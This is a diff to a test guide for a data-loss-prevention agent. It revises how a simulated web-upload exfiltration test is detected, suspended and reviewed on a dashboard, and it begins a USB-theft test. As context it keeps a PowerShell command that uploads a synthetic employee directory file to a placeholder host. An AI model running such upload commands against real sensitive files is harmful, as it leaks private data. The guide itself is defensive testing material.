@@ -55,8 +55,8 @@ This intercepts rogue web uploads.
    ```powershell
    powershell -Command "Invoke-WebRequest -Uri http://example.com -Method Post -InFile 'synthetic_test_data\01_internal_employee_directory.csv'"
    ```
-3. **Expected Result:** The `dlp_agent monitor` will detect the outbound connection from PowerShell. It will intercept the filepath, scan the file, recognize the sensitive data, and instantly terminate the PowerShell process. (It also interfaces with the Windows Defender Firewall to block the attacker's IP!).
-4. **Check the Dashboard:** You will see a new "Network Connection" alert. Click on it, and scroll down to "Sensitive data found" to see the exact SSNs or Passwords the script tried to steal.
+3. **Expected Result:** The `dlp_agent monitor` process detects the PowerShell transfer command, scans the `-InFile` path, and suspends that exact PowerShell process while it waits for an SOC decision.
+4. **Check the Dashboard:** Open the new "Network Connection" alert. Choose **Block** to terminate the verified PowerShell process and its children, or choose **Allow** to resume it. The incident shows the PID, destination, enforcement state, and masked sensitive-data findings.
 
 ### Test Case 3: USB Exfiltration (The Physical Theft)
 *Scenario: An employee plugs in an unregistered thumb drive and attempts to copy financial data onto it.*
